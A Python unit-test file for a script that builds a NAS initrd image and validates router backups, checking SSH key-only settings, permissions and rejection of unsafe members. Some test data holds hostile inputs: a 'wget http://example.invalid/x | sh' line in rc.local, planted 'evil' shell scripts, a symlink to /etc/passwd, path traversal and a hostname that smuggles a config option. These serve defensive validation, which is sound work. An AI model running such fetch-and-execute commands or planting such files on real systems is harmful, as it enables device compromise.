import base64
import copy
import io
import json
from pathlib import Path
import stat
import struct
import subprocess
import sys
import tarfile
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT/'scripts'))
from make_initrd import image, image_from_backup, MAX_MEMBER
from cpio_newc import Entry, encode, decode, unwrap_ramdisk


class InitrdTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(prefix='ls420d-initrd-test-')
        self.root = Path(self.tmp.name)
        self.example = json.loads((ROOT/'examples/example.json').read_text())
        self.config = json.loads((ROOT/'examples/deployment.json').read_text())
        # Deliberately synthetic data, never an actual deployed credential.
        prefix = struct.pack('>I', 11)+b'ssh-ed25519'
        public = prefix+struct.pack('>I', 32)+bytes(range(32))
        (self.root/'admin.pub').write_text('ssh-ed25519'+' '+base64.b64encode(public).decode()+' anonymous-comment\n')
        key = self.root/'dropbear_ed25519_host_key'
        key.write_bytes(prefix+bytes(100))
        key.chmod(0o600)

    def tearDown(self):
        self.tmp.cleanup()

    def entries(self, config=None, example=False):
        blob = image(config or self.config, self.root, example)
        return {e.name: e for e in decode(unwrap_ramdisk(blob))[0]}

    def test_example_is_unprovisioned(self):
        entries = self.entries(self.example, True)
        self.assertNotIn('etc/dropbear/authorized_keys', entries)
        self.assertIn(b"option enable '0'", entries['etc/config/dropbear'].data)
        self.assertIn(b'format=2\nexample=1\n', entries['etc/ls420d-deployment'].data)

    def test_hostname_is_merged_not_replaced(self):
        entries = self.entries()
        # A shipped etc/config/system would stop config_generate from creating
        # the board's LED, button and logging defaults.
        self.assertNotIn('etc/config/system', entries)
        self.assertEqual(entries['etc/ls420d-site.uci'].data,
                         b"set system.@system[0].hostname='ls420d-backup'\n")

    def test_private_key_only(self):
        entries = self.entries()
        self.assertIn(b"option enable '1'", entries['etc/config/dropbear'].data)
        self.assertIn(b"option RootPasswordAuth 'off'", entries['etc/config/dropbear'].data)
        self.assertNotIn(b'anonymous-comment', entries['etc/dropbear/authorized_keys'].data)
        self.assertEqual(stat.S_IMODE(entries['etc/dropbear'].mode), 0o700)
        self.assertEqual(stat.S_IMODE(entries['etc/dropbear/dropbear_ed25519_host_key'].mode), 0o600)
        self.assertEqual(stat.S_IMODE(entries['etc/dropbear/authorized_keys'].mode), 0o600)

    def test_configuration_files_are_world_readable(self):
        entries = self.entries()
        for name in ('etc/config/network', 'etc/config/dropbear', 'etc/ls420d-site.uci', 'etc/ls420d-deployment'):
            self.assertEqual(stat.S_IMODE(entries[name].mode), 0o644, name)
        self.assertEqual(stat.S_IMODE(entries['etc/config'].mode), 0o755)

    def test_no_executable_or_link_members(self):
        for e in self.entries().values():
            self.assertFalse(stat.S_ISLNK(e.mode))
            if stat.S_ISREG(e.mode):
                self.assertEqual(e.mode & 0o111, 0)

    def test_deterministic_and_site_change(self):
        a = image(self.config, self.root)
        self.assertEqual(a, image(self.config, self.root))
        changed = copy.deepcopy(self.config)
        changed['hostname'] = 'different-nas'
        self.assertNotEqual(a, image(changed, self.root))

    def test_unknown_fields(self):
        for key in ('command', 'overlay', 'rootfs', 'password'):
            with self.assertRaises(ValueError):
                image(dict(self.config, **{key: 'anything'}), self.root)

    def test_hostname_injection(self):
        for hostname in ("x'\noption x 'y", 'host.example', '', '-bad'):
            with self.assertRaises(ValueError):
                image(dict(self.config, hostname=hostname), self.root)

    def test_static_network(self):
        config = dict(self.config, network={'mode': 'static', 'address': '192.0.2.10/24',
                                          'gateway': '192.0.2.1', 'dns': ['192.0.2.1']})
        self.assertIn(b'255.255.255.0', self.entries(config)['etc/config/network'].data)
        config['network']['gateway'] = '198.51.100.1'
        with self.assertRaises(ValueError):
            image(config, self.root)

    def test_missing_or_world_readable_host_key(self):
        key = self.root/'dropbear_ed25519_host_key'
        key.chmod(0o644)
        with self.assertRaises(ValueError):
            image(self.config, self.root)
        key.unlink()
        with self.assertRaises(ValueError):
            image(self.config, self.root)

    def test_private_inputs_forbidden_in_example(self):
        with self.assertRaises(ValueError):
            image(self.config, self.root, True)

    def test_invalid_public_key(self):
        (self.root/'admin.pub').write_text('not a public key')
        with self.assertRaises(ValueError):
            image(self.config, self.root)

    def test_crc_corruption(self):
        blob = bytearray(image(self.example, self.root, True))
        blob[-1] ^= 1
        with self.assertRaises(ValueError):
            unwrap_ramdisk(blob)

    def test_path_traversal_and_duplicates(self):
        for path in ('../bad', '/etc/bad', 'a//b'):
            with self.assertRaises(ValueError):
                encode([Entry(path, stat.S_IFREG | 0o600)])
        with self.assertRaises(ValueError):
            encode([Entry('same', 0), Entry('same', 0)])

    def backup(self, members, compress='gz'):
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode='w:' + compress) as archive:
            for name, content in members.items():
                if isinstance(content, tarfile.TarInfo):
                    archive.addfile(content)
                    continue
                info = tarfile.TarInfo(name)
                info.size = len(content)
                info.mode = 0o755 if name.endswith('.sh') else 0o644
                archive.addfile(info, io.BytesIO(content))
        return buffer.getvalue()

    def typical_backup(self):
        host_key = struct.pack('>I', 11) + b'ssh-ed25519' + bytes(100)
        rsa_key = struct.pack('>I', 7) + b'ssh-rsa' + bytes(300)
        public = (self.root/'admin.pub').read_text()
        return {
            './etc/config/system': b"config system\n\toption hostname 'live-nas'\n\toption timezone 'UTC'\n",
            './etc/config/network': b"config interface 'lan'\n\toption device 'eth0'\n\toption proto 'dhcp'\n",
            './etc/config/dropbear': b"config dropbear 'main'\n\toption enable '1'\n\toption PasswordAuth 'off'\n\toption RootPasswordAuth 'off'\n",
            './etc/config/hd-idle': b"config hd-idle\n\toption disk 'sda'\n\toption enabled '1'\n",
            './etc/dropbear/dropbear_ed25519_host_key': host_key,
            './etc/dropbear/dropbear_rsa_host_key': rsa_key,
            './etc/dropbear/authorized_keys': ('# comment\n' + public + '\n').encode(),
            './etc/crontabs/root': b'0 3 * * * /usr/bin/rsync -a src:/data/ /mnt/backup/\n',
            './etc/rc.local': b'# Put your custom commands here\n\nexit 0\n',
            './etc/sysupgrade.conf': b'## keep\n/root/.ssh/\n',
            './etc/hosts': b'127.0.0.1 localhost\n',
            './etc/shadow': b'root:*:0:0:99999:7:::\n',
            './root/.ssh/id_ed25519': b'-----BEGIN OPENSSH ' + b'PRIVATE KEY-----\nfixture\n',
        }

    def test_backup_route(self):
        entries = {e.name: e for e in decode(unwrap_ramdisk(image_from_backup(self.backup(self.typical_backup()))))[0]}
        self.assertIn(b'source=backup\nhostname=live-nas\n', entries['etc/ls420d-deployment'].data)
        self.assertNotIn('etc/rc.local', entries)
        self.assertNotIn('etc/sysupgrade.conf', entries)
        self.assertEqual(entries['etc/crontabs/root'].data.split()[0], b'0')
        self.assertNotIn(b'anonymous-comment', entries['etc/dropbear/authorized_keys'].data)
        self.assertNotIn(b'# comment', entries['etc/dropbear/authorized_keys'].data)
        for name in ('etc/dropbear/dropbear_rsa_host_key', 'etc/shadow', 'root/.ssh/id_ed25519'):
            self.assertEqual(stat.S_IMODE(entries[name].mode), 0o600, name)
        self.assertEqual(stat.S_IMODE(entries['root/.ssh'].mode), 0o700)
        self.assertEqual(stat.S_IMODE(entries['etc/config/hd-idle'].mode), 0o644)
        for e in entries.values():
            if stat.S_ISREG(e.mode):
                self.assertEqual(e.mode & 0o111, 0, e.name)

    def test_root_authorized_keys_validated_and_stripped(self):
        members = self.typical_backup()
        members['./root/.ssh/authorized_keys'] = ((self.root/'admin.pub').read_text() + '\n').encode()
        entries = {e.name: e for e in decode(unwrap_ramdisk(image_from_backup(self.backup(members))))[0]}
        self.assertNotIn(b'anonymous-comment', entries['root/.ssh/authorized_keys'].data)
        self.assertEqual(stat.S_IMODE(entries['root/.ssh/authorized_keys'].mode), 0o600)

    def test_dropbear_off_spellings_accepted(self):
        for value in ('off', '0', 'no', '"false"'):
            members = self.typical_backup()
            members['./etc/config/dropbear'] = ("config dropbear 'main'\n\toption PasswordAuth %s\n\toption RootPasswordAuth %s\n" % (value, value)).encode()
            with self.subTest(value=value):
                image_from_backup(self.backup(members))

    def test_backup_is_deterministic(self):
        data = self.backup(self.typical_backup())
        self.assertEqual(image_from_backup(data), image_from_backup(data))

    def test_backup_rejects_scripts_and_unknown_paths(self):
        for name, content in [
                ('./etc/init.d/evil', b'#!/bin/sh\n'),
                ('./etc/uci-defaults/99-evil', b'#!/bin/sh\n'),
                ('./etc/hotplug.d/iface/00-evil', b'#!/bin/sh\n'),
                ('./usr/bin/evil.sh', b'#!/bin/sh\n'),
                ('./etc/rc.local', b'wget http://example.invalid/x | sh\nexit 0\n'),
                ('./etc/config/sub/dir', b'nested\n'),
                ('./etc/dropbear/other', b'x' * 70),
                ('./etc/ls420d-site.uci', b"set system.@system[0].hostname='x'\n"),
                ('../etc/hosts', b'x\n'),
                ('./etc/config/dropbear', b"config dropbear\n\toption PasswordAuth 'on'\n\toption RootPasswordAuth 'off'\n"),
                ('./etc/config/dropbear', b"config dropbear\n\toption PasswordAuth 'off'\n\toption RootPasswordAuth '1'\n"),
                # Absent options mean ON for Dropbear: an omitted option is a bypass.
                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption enable '1'\n"),
                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption RootPasswordAuth 'off'\n"),
                # A second instance without the options is a bypass too.
                ('./etc/config/dropbear', b"config dropbear 'main'\n\toption PasswordAuth 'off'\n\toption RootPasswordAuth 'off'\n\nconfig dropbear 'second'\n\toption Port '2222'\n"),
                ('./etc/config/dropbear', b"config other\n\toption PasswordAuth 'off'\n"),
                ('./etc/config/dropbear', b"# nothing\n"),
                ('./root/.ssh/authorized_keys', b'ssh-dss AAAA garbage\n'),
                ('./etc/config/bad.name', b"config x\n"),
                ('./etc/dropbear/authorized_keys', b'ssh-dss AAAA garbage\n'),
                ('./etc/dropbear/dropbear_ed25519_host_key', b'-----BEGIN OPENSSH ' + b'PRIVATE KEY-----\n' + bytes(64)),
                ('./etc/config/network', b'text\0binary\n'),
                ('./etc/config/large', b'x' * (MAX_MEMBER + 1))]:
            members = self.typical_backup()
            members[name] = content
            with self.subTest(name=name):
                with self.assertRaises(ValueError):
                    image_from_backup(self.backup(members))

    def test_backup_rejects_links_and_garbage(self):
        link = tarfile.TarInfo('./etc/config/network')
        link.type = tarfile.SYMTYPE
        link.linkname = '/etc/passwd'
        members = self.typical_backup()
        members['link'] = link
        with self.assertRaises(ValueError):
            image_from_backup(self.backup(members))
        with self.assertRaises(ValueError):
            image_from_backup(b'not a tar archive')
        with self.assertRaises(ValueError):
            image_from_backup(self.backup({'./etc/sysupgrade.conf': b'\n'}))

    def test_cli_backup_route(self):
        archive = self.root/'backup.tar.gz'
        archive.write_bytes(self.backup(self.typical_backup()))
        output = self.root/'from-backup.buffalo'
        command = [sys.executable, str(ROOT/'scripts/make_initrd.py'), '--backup', str(archive), '--output', str(output)]
        result = subprocess.run(command, capture_output=True, text=True)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('PRIVATE', result.stdout)
        self.assertEqual(stat.S_IMODE(output.stat().st_mode), 0o600)

    def test_cli_refuses_overwrite(self):
        output = self.root/'initrd.buffalo'
        command = [sys.executable, str(ROOT/'scripts/make_initrd.py'), '--example', '--output', str(output)]
        subprocess.run(command, check=True, stdout=subprocess.DEVNULL)
        before = output.read_bytes()
        self.assertNotEqual(subprocess.run(command, capture_output=True).returncode, 0)
        self.assertEqual(before, output.read_bytes())


if __name__ == '__main__':
    unittest.main()
